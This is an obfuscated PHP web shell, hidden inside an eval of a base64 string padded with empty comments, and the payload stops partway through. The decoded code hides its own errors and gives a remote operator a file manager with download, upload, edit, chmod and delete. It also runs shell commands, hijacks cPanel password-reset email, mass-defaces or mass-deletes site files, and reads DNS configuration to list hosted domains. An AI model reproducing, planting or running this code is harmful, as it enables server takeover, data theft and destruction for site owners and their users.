<?php /****/@null; /********/ /********/ /********/@eval/****/("?>".base64_decode("PD9waHANCg0Kc2Vzc2lvbl9zdGFydCgpOw0KZXJyb3JfcmVwb3J0aW5nKDApOw0Kc2V0X3RpbWVfbGltaXQoMCk7DQpjbGVhcnN0YXRjYWNoZSgpOw0KQGluaV9zZXQoJ2Vycm9yX2xvZycsIDApOw0KQGluaV9zZXQoJ2xvZ19lcnJvcnMnLCAwKTsNCkBpbmlfc2V0KCdtYXhfZXhlY3V0aW9uX3RpbWUnLCAwKTsNCkBpbmlfc2V0KCdvdXRwdXRfYnVmZmVyaW5nJywgMCk7DQpAaW5pX3NldCgnZGlzcGxheV9lcnJvcnMnLCAwKTsNCg0KaWYgKGlzc2V0KCRfR0VUWydkaXInXSkpIHsNCiAgICAkcGF0aCA9ICRfR0VUWydkaXInXTsNCiAgICBjaGRpcigkX0dFVFsnZGlyJ10pOw0KfSBlbHNlIHsNCiAgICAkcGF0aCA9IGdldGN3ZCgpOw0KfQ0KDQokcGF0aCA9IHN0cl9yZXBsYWNlKCdcXCcsICcvJywgJHBhdGgpOw0KJGV4ZGlyID0gZXhwbG9kZSgnLycsICRwYXRoKTsNCg0KaWYgKGlzc2V0KCRfR0VUWydhY3Rpb24nXSkgJiYgJF9HRVRbJ2FjdGlvbiddID09ICdkb3dubG9hZCcpIHsNCiAgICBAb2JfY2xlYW4oKTsNCiAgICAkZmlsZSA9ICRfR0VUWydpdGVtJ107DQogICAgaGVhZGVyKCdDb250ZW50LURlc2NyaXB0aW9uOiBGaWxlIFRyYW5zZmVyJyk7DQogICAgaGVhZGVyKCdDb250ZW50LVR5cGU6IHRleHQvcGxhaW4nKTsNCiAgICBoZWFkZXIoJ0NvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPSInIC4gYmFzZW5hbWUoJGZpbGUpIC4gJyInKTsNCiAgICBoZWFkZXIoJ0V4cGlyZXM6IDAnKTsNCiAgICBoZWFkZXIoJ0NhY2hlLUNvbnRyb2w6IG11c3QtcmV2YWxpZGF0ZScpOw0KICAgIGhlYWRlcignUHJhZ21hOiBwdWJsaWMnKTsNCiAgICBoZWFkZXIoJ0NvbnRlbnQtTGVuZ3RoOiAnIC4gZmlsZXNpemUoJGZpbGUpKTsNCiAgICByZWFkZmlsZSgkZmlsZSk7DQogICAgZXhpdDsNCn0NCg0KZnVuY3Rpb24gZmxhc2goJG1lc3NhZ2UsICRzdGF0dXMsICRjbGFzcywgJHJlZGlyZWN0ID0gZmFsc2UpDQp7DQogICAgaWYgKCFlbXB0eSgkX1NFU1NJT05bIm1lc3NhZ2UiXSkpIHsNCiAgICAgICAgdW5zZXQoJF9TRVNTSU9OWyJtZXNzYWdlIl0pOw0KICAgIH0NCiAgICBpZiAoIWVtcHR5KCRfU0VTU0lPTlsiY2xhc3MiXSkpIHsNCiAgICAgICAgdW5zZXQoJF9TRVNTSU9OWyJjbGFzcyJdKTsNCiAgICB9DQogICAgaWYgKCFlbXB0eSgkX1NFU1NJT05bInN0YXR1cyJdKSkgew0KICAgICAgICB1bnNldCgkX1NFU1NJT05bInN0YXR1cyJdKTsNCiAgICB9DQogICAgJF9TRVNTSU9OWyJtZXNzYWdlIl0gPSAkbWVzc2FnZTsNCiAgICAkX1NFU1NJT05bImNsYXNzIl0gPSAkY2xhc3M7DQogICAgJF9TRVNTSU9OWyJzdGF0dXMiXSA9ICRzdGF0dXM7DQogICAgaWYgKCRyZWRpcmVjdCkgew0KICAgICAgICBoZWFkZXIoJ0xvY2F0aW9uOiAnIC4gJHJlZGlyZWN0KTsNCiAgICAgICAgZXhpdCgpOw0KICAgIH0NCiAgICByZXR1cm4gdHJ1ZTsNCn0NCg0KZnVuY3Rpb24gY2xlYXIoKQ0Kew0KICAgIGlmICghZW1wdHkoJF9TRVNTSU9OWyJtZXNzYWdlIl0pKSB7DQogICAgICAgIHVuc2V0KCRfU0VTU0lPTlsibWVzc2FnZSJdKTsNCiAgICB9DQogICAgaWYgKCFlbXB0eSgkX1NFU1NJT05bImNsYXNzIl0pKSB7DQogICAgICAgIHVuc2V0KCRfU0VTU0lPTlsiY2xhc3MiXSk7DQogICAgfQ0KICAgIGlmICghZW1wdHkoJF9TRVNTSU9OWyJzdGF0dXMiXSkpIHsNCiAgICAgICAgdW5zZXQoJF9TRVNTSU9OWyJzdGF0dXMiXSk7DQogICAgfQ0KICAgIHJldHVybiB0cnVlOw0KfQ0KDQpmdW5jdGlvbiB3cml0YWJsZSgkcGF0aCwgJHBlcm1zKQ0Kew0KICAgIHJldHVybiAoIWlzX3dyaXRhYmxlKCRwYXRoKSkgPyAiPGZvbnQgY29sb3I9XCJyZWRcIj4iIC4gJHBlcm1zIC4gIjwvZm9udD4iIDogIjxmb250IGNvbG9yPVwibGltZVwiPiIgLiAkcGVybXMgLiAiPC9mb250PiI7DQp9DQoNCmZ1bmN0aW9uIHBlcm1zKCRwYXRoKQ0Kew0KICAgICRwZXJtcyA9IGZpbGVwZXJtcygkcGF0aCk7DQogICAgaWYgKCgkcGVybXMgJiAweEMwMDApID09IDB4QzAwMCkgew0KICAgICAgICAvLyBTb2NrZXQNCiAgICAgICAgJGluZm8gPSAncyc7DQogICAgfSBlbHNlaWYgKCgkcGVybXMgJiAweEEwMDApID09IDB4QTAwMCkgew0KICAgICAgICAvLyBTeW1ib2xpYyBMaW5rDQogICAgICAgICRpbmZvID0gJ2wnOw0KICAgIH0gZWxzZWlmICgoJHBlcm1zICYgMHg4MDAwKSA9PSAweDgwMDApIHsNCiAgICAgICAgLy8gUmVndWxhcg0KICAgICAgICAkaW5mbyA9ICctJzsNCiAgICB9IGVsc2VpZiAoKCRwZXJtcyAmIDB4NjAwMCkgPT0gMHg2MDAwKSB7DQogICAgICAgIC8vIEJsb2NrIHNwZWNpYWwNCiAgICAgICAgJGluZm8gPSAnYic7DQogICAgfSBlbHNlaWYgKCgkcGVybXMgJiAweDQwMDApID09IDB4NDAwMCkgew0KICAgICAgICAvLyBEaXJlY3RvcnkNCiAgICAgICAgJGluZm8gPSAnZCc7DQogICAgfSBlbHNlaWYgKCgkcGVybXMgJiAweDIwMDApID09IDB4MjAwMCkgew0KICAgICAgICAvLyBDaGFyYWN0ZXIgc3BlY2lhbA0KICAgICAgICAkaW5mbyA9ICdjJzsNCiAgICB9IGVsc2VpZiAoKCRwZXJtcyAmIDB4MTAwMCkgPT0gMHgxMDAwKSB7DQogICAgICAgIC8vIEZJRk8gcGlwZQ0KICAgICAgICAkaW5mbyA9ICdwJzsNCiAgICB9IGVsc2Ugew0KICAgICAgICAvLyBVbmtub3duDQogICAgICAgICRpbmZvID0gJ3UnOw0KICAgIH0NCg0KICAgIC8vIE93bmVyDQogICAgJGluZm8gLj0gKCgkcGVybXMgJiAweDAxMDApID8gJ3InIDogJy0nKTsNCiAgICAkaW5mbyAuPSAoKCRwZXJtcyAmIDB4MDA4MCkgPyAndycgOiAnLScpOw0KICAgICRpbmZvIC49ICgoJHBlcm1zICYgMHgwMDQwKSA/DQogICAgICAgICgoJHBlcm1zICYgMHgwODAwKSA/ICdzJyA6ICd4JykgOg0KICAgICAgICAoKCRwZXJtcyAmIDB4MDgwMCkgPyAnUycgOiAnLScpKTsNCg0KICAgIC8vIEdyb3VwDQogICAgJGluZm8gLj0gKCgkcGVybXMgJiAweDAwMjApID8gJ3InIDogJy0nKTsNCiAgICAkaW5mbyAuPSAoKCRwZXJtcyAmIDB4MDAxMCkgPyAndycgOiAnLScpOw0KICAgICRpbmZvIC49ICgoJHBlcm1zICYgMHgwMDA4KSA/DQogICAgICAgICgoJHBlcm1zICYgMHgwNDAwKSA/ICdzJyA6ICd4JykgOg0KICAgICAgICAoKCRwZXJtcyAmIDB4MDQwMCkgPyAnUycgOiAnLScpKTsNCg0KICAgIC8vIFdvcmxkDQogICAgJGluZm8gLj0gKCgkcGVybXMgJiAweDAwMDQpID8gJ3InIDogJy0nKTsNCiAgICAkaW5mbyAuPSAoKCRwZXJtcyAmIDB4MDAwMikgPyAndycgOiAnLScpOw0KICAgICRpbmZvIC49ICgoJHBlcm1zICYgMHgwMDAxKSA/DQogICAgICAgICgoJHBlcm1zICYgMHgwMjAwKSA/ICd0JyA6ICd4JykgOg0KICAgICAgICAoKCRwZXJtcyAmIDB4MDIwMCkgPyAnVCcgOiAnLScpKTsNCg0KICAgIHJldHVybiAkaW5mbzsNCn0NCg0KZnVuY3Rpb24gZnNpemUoJGZpbGUpDQp7DQogICAgJGEgPSBbIkIiLCAiS0IiLCAiTUIiLCAiR0IiLCAiVEIiLCAiUEIiXTsNCiAgICAkcG9zID0gMDsNCiAgICAkc2l6ZSA9IGZpbGVzaXplKCRmaWxlKTsNCiAgICB3aGlsZSAoJHNpemUgPj0gMTAyNCkgew0KICAgICAgICAkc2l6ZSAvPSAxMDI0Ow0KICAgICAgICAkcG9zKys7DQogICAgfQ0KICAgIHJldHVybiByb3VuZCgkc2l6ZSwgMikgLiAiICIgLiAkYVskcG9zXTsNCn0NCg0KLy8gQ01EDQpmdW5jdGlvbiBjbWQoJGNvbW1hbmQpDQp7DQogICAgZ2xvYmFsICRwYXRoOw0KICAgIGlmIChzdHJwb3MoJGNvbW1hbmQsICdyZXNldGNwJykgIT09IGZhbHNlKSB7DQogICAgICAgICRlbWFpbCA9IGV4cGxvZGUoJyAnLCAkY29tbWFuZCk7DQogICAgICAgIGlmICghJGVtYWlsWzFdIHx8ICFmaWx0ZXJfdmFyKCRlbWFpbFsxXSwgRklMVEVSX1ZBTElEQVRFX0VNQUlMKSkgew0KICAgICAgICAgICAgcmV0dXJuICJZb3UgbXVzdCBzcGVjaWZpZWQgdmFsaWQgZW1haWwgYWRkcmVzcy4gcmVzZXRjcCB5b3VyZW1haWxAZXhhbXBsZS5jb20iOw0KICAgICAgICB9DQogICAgICAgICRwYXRoY3AgPSBleHBsb2RlKCIvIiwgJHBhdGgpOw0KICAgICAgICAkdGV4dCA9ICItLS1cblwiZW1haWxcIjonJGVtYWlsWzFdJyI7DQogICAgICAgICRmaWxlID0gam9pbignLycsIFskcGF0aGNwWzBdLCAkcGF0aGNwWzFdLCAkcGF0aGNwWzJdXSk7DQogICAgICAgICRmaWxlID0gJGZpbGUgLiAnLy5jcGFuZWwvJzsNCiAgICAgICAgaWYgKGZpbGVfZXhpc3RzKCRmaWxlIC4gJ2NvbnRhY3RpbmZvJykpIHsNCiAgICAgICAgICAgIHVubGluaygkZmlsZSAuICdjb250YWN0aW5mbycpOw0KICAgICAgICB9DQogICAgICAgIGZpbGVfcHV0X2NvbnRlbnRzKCRmaWxlIC4gJ3Jlc2V0JywgJHRleHQpOw0KICAgICAgICBpZiAoZmlsZV9leGlzdHMoJGZpbGUgLiAncmVzZXQnKSkgew0KICAgICAgICAgICAgcmVuYW1lKCRmaWxlIC4gJ3Jlc2V0JywgJGZpbGUgLiAnY29udGFjdGluZm8nKTsNCiAgICAgICAgICAgIHJldHVybiAiRW1haWwgZm9yIHJlc2V0IGNwYW5lbCBjaGFuZ2VkIHRvICckZW1haWxbMV0nIjsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gIkZhaWxlZCB0byBjaGFuZ2UgcmVzZXQgY3AgZW1haWwhIjsNCiAgICB9IGVsc2VpZiAoZnVuY3Rpb25fZXhpc3RzKCdzaGVsbF9leGVjJykpIHsNCiAgICAgICAgcmV0dXJuIHNoZWxsX2V4ZWMoJGNvbW1hbmQgLiAnIDI+JjEnKTsNCiAgICB9IGVsc2Ugew0KICAgICAgICByZXR1cm4gIkRpc2FibGUgRnVuY3Rpb24iOw0KICAgIH0NCn0NCg0KZnVuY3Rpb24gd2hpY2goJHApDQp7DQogICAgJHBhdGggPSBjbWQoJ3doaWNoICcgLiAkcCk7DQogICAgaWYgKCFlbXB0eSgkcGF0aCkpIHsNCiAgICAgICAgcmV0dXJuIHN0cmxlbigkcGF0aCk7DQogICAgfQ0KICAgIHJldHVybiBmYWxzZTsNCn0NCg0KZnVuY3Rpb24gZm9ybWF0U2l6ZSgkYnl0ZXMpDQp7DQogICAgJHR5cGVzID0gYXJyYXkoJ0InLCAnS0InLCAnTUInLCAnR0InLCAnVEInKTsNCiAgICBmb3IgKCRpID0gMDsgJGJ5dGVzID49IDEwMjQgJiYgJGkgPCAoY291bnQoJHR5cGVzKSAtIDEpOyAkYnl0ZXMgLz0gMTAyNCwgJGkrKykgOw0KICAgIHJldHVybiAocm91bmQoJGJ5dGVzLCAyKSAuICIgIiAuICR0eXBlc1skaV0pOw0KfQ0KDQpmdW5jdGlvbiBnZXRPd25lcigkaXRlbSkNCnsNCiAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCJwb3NpeF9nZXRwd3VpZCIpKSB7DQogICAgICAgICRkb3duZXIgPSBAcG9zaXhfZ2V0cHd1aWQoZmlsZW93bmVyKCRpdGVtKSk7DQogICAgICAgICRkb3duZXIgPSAkZG93bmVyWyduYW1lJ107DQogICAgfSBlbHNlIHsNCiAgICAgICAgJGRvd25lciA9IGZpbGVvd25lcigkaXRlbSk7DQogICAgfQ0KICAgIGlmIChmdW5jdGlvbl9leGlzdHMoInBvc2l4X2dldGdyZ2lkIikpIHsNCiAgICAgICAgJGRncnAgPSBAcG9zaXhfZ2V0Z3JnaWQoZmlsZWdyb3VwKCRpdGVtKSk7DQogICAgICAgICRkZ3JwID0gJGRncnBbJ25hbWUnXTsNCiAgICB9IGVsc2Ugew0KICAgICAgICAkZGdycCA9IGZpbGVncm91cCgkaXRlbSk7DQogICAgfQ0KICAgIHJldHVybiAkZG93bmVyIC4gJy8nIC4gJGRncnA7DQp9DQoNCi8vIE1hc3MgRGVmYWNlDQpmdW5jdGlvbiBtYXNzZGVmKCRkaXIsICRmaWxlLCAkY29udGVudCkNCnsNCiAgICBpZiAoaXNfd3JpdGFibGUoJGRpcikpIHsNCiAgICAgICAgJGRpcmEgPSBzY2FuZGlyKCRkaXIpOw0KICAgICAgICBmb3JlYWNoICgkZGlyYSBhcyAkZGlyYikgew0KICAgICAgICAgICAgJGRpcmMgPSAiJGRpci8kZGlyYiI7DQogICAgICAgICAgICAkbG9rYXNpID0gJGRpcmMgLiAnLycgLiAkZmlsZTsNCiAgICAgICAgICAgIGlmICgkZGlyYiA9PT0gJy4nKSB7DQogICAgICAgICAgICAgICAgZmlsZV9wdXRfY29udGVudHMoJGxva2FzaSwgJGNvbnRlbnQpOw0KICAgICAgICAgICAgfSBlbHNlaWYgKCRkaXJiID09PSAnLi4nKSB7DQogICAgICAgICAgICAgICAgZmlsZV9wdXRfY29udGVudHMoJGxva2FzaSwgJGNvbnRlbnQpOw0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICBpZiAoaXNfZGlyKCRkaXJjKSkgew0KICAgICAgICAgICAgICAgICAgICBpZiAoaXNfd3JpdGFibGUoJGRpcmMpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBlY2hvICIkZGlyYi8kZmlsZVxuIjsNCiAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfcHV0X2NvbnRlbnRzKCRsb2thc2ksICRjb250ZW50KTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KLy8gTWFzcyBEZWxldGUNCmZ1bmN0aW9uIG1hc3NkZWwoJGRpciwgJGZpbGUpDQp7DQogICAgaWYgKGlzX3dyaXRhYmxlKCRkaXIpKSB7DQogICAgICAgICRkaXJhID0gc2NhbmRpcigkZGlyKTsNCiAgICAgICAgZm9yZWFjaCAoJGRpcmEgYXMgJGRpcmIpIHsNCiAgICAgICAgICAgICRkaXJjID0gIiRkaXIvJGRpcmIiOw0KICAgICAgICAgICAgJGxva2FzaSA9ICRkaXJjIC4gJy8nIC4gJGZpbGU7DQogICAgICAgICAgICBpZiAoJGRpcmIgPT09ICcuJykgew0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygiJGRpci8kZmlsZSIpKSB7DQogICAgICAgICAgICAgICAgICAgIHVubGluaygiJGRpci8kZmlsZSIpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0gZWxzZWlmICgkZGlyYiA9PT0gJy4uJykgew0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygnJyAuIGRpcm5hbWUoJGRpcikgLiAiLyRmaWxlIikpIHsNCiAgICAgICAgICAgICAgICAgICAgdW5saW5rKCcnIC4gZGlybmFtZSgkZGlyKSAuICIvJGZpbGUiKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgIGlmIChpc19kaXIoJGRpcmMpKSB7DQogICAgICAgICAgICAgICAgICAgIGlmIChpc193cml0YWJsZSgkZGlyYykpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkbG9rYXNpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAiJGxva2FzaSA+IERlbGV0ZWRcbiI7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdW5saW5rKCRsb2thc2kpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtYXNzZGVsID0gbWFzc2RlbCgkZGlyYywgJGZpbGUpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KfQ0KDQppZiAoaXNzZXQoJF9QT1NUWyduZXdGb2xkZXJOYW1lJ10pKSB7DQogICAgaWYgKG1rZGlyKCRwYXRoIC4gJy8nIC4gJF9QT1NUWyduZXdGb2xkZXJOYW1lJ10pKSB7DQogICAgICAgIGZsYXNoKCJDcmVhdGUgRm9sZGVyIFN1Y2Nlc3NmdWxseSEiLCAiU3VjY2VzcyIsICJzdWNjZXNzIiwgIj9kaXI9JHBhdGgiKTsNCiAgICB9IGVsc2Ugew0KICAgICAgICBmbGFzaCgiQ3JlYXRlIEZvbGRlciBGYWlsZWQiLCAiRmFpbGVkIiwgImVycm9yIiwgIj9kaXI9JHBhdGgiKTsNCiAgICB9DQp9DQppZiAoaXNzZXQoJF9QT1NUWyduZXdGaWxlTmFtZSddKSAmJiBpc3NldCgkX1BPU1RbJ25ld0ZpbGVDb250ZW50J10pKSB7DQogICAgaWYgKGZpbGVfcHV0X2NvbnRlbnRzKCRfUE9TVFsnbmV3RmlsZU5hbWUnXSwgJF9QT1NUWyduZXdGaWxlQ29udGVudCddKSkgew0KICAgICAgICBmbGFzaCgiQ3JlYXRlIEZpbGUgU3VjY2Vzc2Z1bGx5ISIsICJTdWNjZXNzIiwgInN1Y2Nlc3MiLCAiP2Rpcj0kcGF0aCIpOw0KICAgIH0gZWxzZSB7DQogICAgICAgIGZsYXNoKCJDcmVhdGUgRmlsZSBGYWlsZWQiLCAiRmFpbGVkIiwgImVycm9yIiwgIj9kaXI9JHBhdGgiKTsNCiAgICB9DQp9DQppZiAoaXNzZXQoJF9QT1NUWyduZXdOYW1lJ10pICYmIGlzc2V0KCRfR0VUWydpdGVtJ10pKSB7DQogICAgaWYgKCRfUE9TVFsnbmV3TmFtZSddID09ICcnKSB7DQogICAgICAgIGZsYXNoKCJZb3UgbWlzcyBhbiBpbXBvcnRhbnQgdmFsdWUiLCAiT29vcHNzLi4iLCAid2FybmluZyIsICI/ZGlyPSRwYXRoIik7DQogICAgfQ0KICAgIGlmIChyZW5hbWUoJHBhdGggLiAnLycgLiAkX0dFVFsnaXRlbSddLCAkX1BPU1RbJ25ld05hbWUnXSkpIHsNCiAgICAgICAgZmxhc2goIlJlbmFtZSBTdWNjZXNzZnVsbHkhIiwgIlN1Y2Nlc3MiLCAic3VjY2VzcyIsICI/ZGlyPSRwYXRoIik7DQogICAgfSBlbHNlIHsNCiAgICAgICAgZmxhc2goIlJlbmFtZSBGYWlsZWQiLCAiRmFpbGVkIiwgImVycm9yIiwgIj9kaXI9JHBhdGgiKTsNCiAgICB9DQp9DQppZiAoaXNzZXQoJF9QT1NUWyduZXdDb250ZW50J10pICYmIGlzc2V0KCRfR0VUWydpdGVtJ10pKSB7DQogICAgaWYgKGZpbGVfcHV0X2NvbnRlbnRzKCRwYXRoIC4gJy8nIC4gJF9HRVRbJ2l0ZW0nXSwgJF9QT1NUWyduZXdDb250ZW50J10pKSB7DQogICAgICAgIGZsYXNoKCJFZGl0IFN1Y2Nlc3NmdWxseSEiLCAiU3VjY2VzcyIsICJzdWNjZXNzIiwgIj9kaXI9JHBhdGgiKTsNCiAgICB9IGVsc2Ugew0KICAgICAgICBmbGFzaCgiRWRpdCBGYWlsZWQiLCAiRmFpbGVkIiwgImVycm9yIiwgIj9kaXI9JHBhdGgiKTsNCiAgICB9DQp9DQppZiAoaXNzZXQoJF9QT1NUWyduZXdQZXJtJ10pICYmIGlzc2V0KCRfR0VUWydpdGVtJ10pKSB7DQogICAgaWYgKCRfUE9TVFsnbmV3UGVybSddID09ICcnKSB7DQogICAgICAgIGZsYXNoKCJZb3UgbWlzcyBhbiBpbXBvcnRhbnQgdmFsdWUiLCAiT29vcHNzLi4iLCAid2FybmluZyIsICI/ZGlyPSRwYXRoIik7DQogICAgfQ0KICAgIGlmIChjaG1vZCgkcGF0aCAuICcvJyAuICRfR0VUWydpdGVtJ10sICRfUE9TVFsnbmV3UGVybSddKSkgew0KICAgICAgICBmbGFzaCgiQ2hhbmdlIFBlcm1pc3Npb24gU3VjY2Vzc2Z1bGx5ISIsICJTdWNjZXNzIiwgInN1Y2Nlc3MiLCAiP2Rpcj0kcGF0aCIpOw0KICAgIH0gZWxzZSB7DQogICAgICAgIGZsYXNoKCJDaGFuZ2UgUGVybWlzc2lvbiIsICJGYWlsZWQiLCAiZXJyb3IiLCAiP2Rpcj0kcGF0aCIpOw0KICAgIH0NCn0NCg0KaWYgKGlzc2V0KCRfR0VUWydhY3Rpb24nXSkpIHsNCiAgICAkYWN0aW9uID0gJF9HRVRbJ2FjdGlvbiddOw0KICAgIGlmICgkYWN0aW9uID09ICdkZWxldGUnICYmIGlzc2V0KCRfR0VUWydpdGVtJ10pKSB7DQogICAgICAgIGZ1bmN0aW9uIHJlbW92ZWRpcigkZGlyKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAoIXJtZGlyKCRkaXIpKSB7DQogICAgICAgICAgICAgICAgJGZpbGUgPSBzY2FuZGlyKCRkaXIpOw0KICAgICAgICAgICAgICAgIGZvcmVhY2ggKCRmaWxlIGFzICRmaWxlcykgew0KICAgICAgICAgICAgICAgICAgICBpZiAoaXNfZmlsZSgkZGlyIC4gIi8iIC4gJGZpbGVzKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHVubGluaygkZGlyIC4gIi8iIC4gJGZpbGVzKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJtZGlyKCRkaXIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGlmIChpc19kaXIoJGRpciAuICIvIiAuICRmaWxlcykpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJtZGlyKCRkaXIgLiAiLyIgLiAkZmlsZXMpOw0KICAgICAgICAgICAgICAgICAgICAgICAgcm1kaXIoJGRpcik7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBpZiAoaXNfZGlyKCRfR0VUWydpdGVtJ10pKSB7DQogICAgICAgICAgICBpZiAocmVtb3ZlZGlyKCRfR0VUWydpdGVtJ10pKSB7DQogICAgICAgICAgICAgICAgZmxhc2goIkRlbGV0ZSBGb2xkZXIgU3VjY2Vzc2Z1bGx5ISIsICJTdWNjZXNzIiwgInN1Y2Nlc3MiLCAiP2Rpcj0kcGF0aCIpOw0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICBmbGFzaCgiRGVsZXRlIEZvbGRlciBTdWNjZXNzZnVsbHkhIiwgIlN1Y2Nlc3MiLCAic3VjY2VzcyIsICI/ZGlyPSRwYXRoIik7DQogICAgICAgICAgICB9DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBpZiAodW5saW5rKCRfR0VUWydpdGVtJ10pKSB7DQogICAgICAgICAgICAgICAgZmxhc2goIkRlbGV0ZSBGaWxlIFN1Y2Nlc3NmdWxseSEiLCAiU3VjY2VzcyIsICJzdWNjZXNzIiwgIj9kaXI9JHBhdGgiKTsNCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgZmxhc2goIkRlbGV0ZSBGaWxlIEZhaWxlZCIsICJGYWlsZWQiLCAiZXJyb3IiLCAiP2Rpcj0kcGF0aCIpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KfQ0KDQppZiAoaXNzZXQoJF9GSUxFU1sndXBsb2FkZmlsZSddKSkgew0KICAgICR0b3RhbCA9IGNvdW50KCRfRklMRVNbJ3VwbG9hZGZpbGUnXVsnbmFtZSddKTsNCiAgICBmb3IgKCRpID0gMDsgJGkgPCAkdG90YWw7ICRpKyspIHsNCiAgICAgICAgJG1haW51cGxvYWQgPSBtb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1sndXBsb2FkZmlsZSddWyd0bXBfbmFtZSddWyRpXSwgJF9GSUxFU1sndXBsb2FkZmlsZSddWyduYW1lJ11bJGldKTsNCiAgICB9DQogICAgaWYgKCR0b3RhbCA8IDIpIHsNCiAgICAgICAgaWYgKCRtYWludXBsb2FkKSB7DQogICAgICAgICAgICBmbGFzaCgiVXBsb2FkIEZpbGUgU3VjY2Vzc2Z1bGx5ISAiLCAiU3VjY2VzcyIsICJzdWNjZXNzIiwgIj9kaXI9JHBhdGgiKTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIGZsYXNoKCJVcGxvYWQgRmFpbGVkIiwgIkZhaWxlZCIsICJlcnJvciIsICI/ZGlyPSRwYXRoIik7DQogICAgICAgIH0NCiAgICB9IGVsc2Ugew0KICAgICAgICBpZiAoJG1haW51cGxvYWQpIHsNCiAgICAgICAgICAgIGZsYXNoKCJVcGxvYWQgJGkgRmlsZXMgU3VjY2Vzc2Z1bGx5ISAiLCAiU3VjY2VzcyIsICJzdWNjZXNzIiwgIj9kaXI9JHBhdGgiKTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIGZsYXNoKCJVcGxvYWQgRmFpbGVkIiwgIkZhaWxlZCIsICJlcnJvciIsICI/ZGlyPSRwYXRoIik7DQogICAgICAgIH0NCiAgICB9DQp9DQoNCiRkMG1haW5zID0gQGZpbGUoIi9ldGMvbmFtZWQuY29uZiIsIGZhbHNlKTsNCmlmICghJGQwbWFpbnMpIHsNCiAgICAkZG9tID0gIkNhbnQgcmVhZCBbIC9ldGMvbmFtZWQuY29uZiBdIjsNCiAgICAkR0xPQkFMU1sibmVlZF90b191cGRhdGVfaGVhZGVyIl0gPSAidHJ1ZSI7DQp9IGVsc2Ugew0KICAgICRjb3VudCA9IDA7DQogICAgZm9yZWFjaCAoJGQwbWFpbnMgYXMgJGQwbWFpbikgew0KICAgICAgICBpZiAoQHN0cnN0cigkZDBtYWluLCAiem9uZSIpKSB7DQogICAgICAgICAgICBwcmVnX21hdGNoX2FsbCgnI3pvbmUgIiguKikiIycsICRkMG1haW4sICRkb21haW5zKTsNCiAgICAgICAgICAgIGZsdXNoKCk7DQogICAgICAgICAgICBpZiAoc3RybGVuKHRyaW0oJGRvbWFpbnNbMV1bMF0pKSA+IDIpIHsNCiAgICAgICAgICAgICAgICBmbHVzaCgpOw0KICAgICAgICAgICAgICAgICRjb3VudCsrOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KICAgICRkb20gPSAiJGNvdW50IERvbWFpbiI7DQp9DQoNCmlmIChzdHJ0b2xvd2VyKHN1YnN0cihQSFBfT1MsIDAsIDMpKSA9PSAid2luIikgew0KICAgICRzeXMgPSAid2luIjsNCn0gZWxzZSB7DQogICAgJHN5cyA9ICJ1bml4IjsNCn0NCg0KaWYgKCRzeXMgPT0gJ3VuaXgnKSB7DQogICAgJHVzZWZ1bCA9ICIiOw0KICAgICRkb3dubG9hZGVyID0gIiI7DQogICAgaWYgKCFAaW5pX2dldCgnc2FmZV9tb2RlJykpIHsNCiAgICAgICAgaWYgKHN0cmxlbihjbWQoImlkIikpID4gMCkgew0KICAgICAgICAgICAgJHVzZXJmdWwgPSBbJ2djYycsICdsY2MnLCAnY2MnLCAnbGQnLCAnbWFrZScsICdwaHAnLCAncGVybCcsICdweXRob24nLCAncnVieScsICd0YXInLCAnZ3ppcCcsICdiemlwJywgJ2J6aWFsZmEyJywgJ25jJywgJ2xvY2F0ZScsICdzdWlkcGVybCcsICdnaXQnLCAnZG9ja2VyJywgJ3NzaCddOw0KICAgICAgICAgICAgJHggPSAwOw0KICAgICAgICAgICAgZm9yZWFjaCAoJHVzZXJmdWwgYXMgJGkpIHsNCiAgICAgICAgICAgICAgICBpZiAod2hpY2goJGkpKSB7DQogICAgICAgICAgICAgICAgICAgICR4Kys7DQogICAgICAgICAgICAgICAgICAgICR1c2VmdWwgLj0gJGkgLiAnLCAnOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGlmICgkeCA9PSAwKSB7DQogICAgICAgICAgICAgICAgJHVzZWZ1bCA9ICctLS0tLS0tLSc7DQogICAgICAgICAgICB9DQo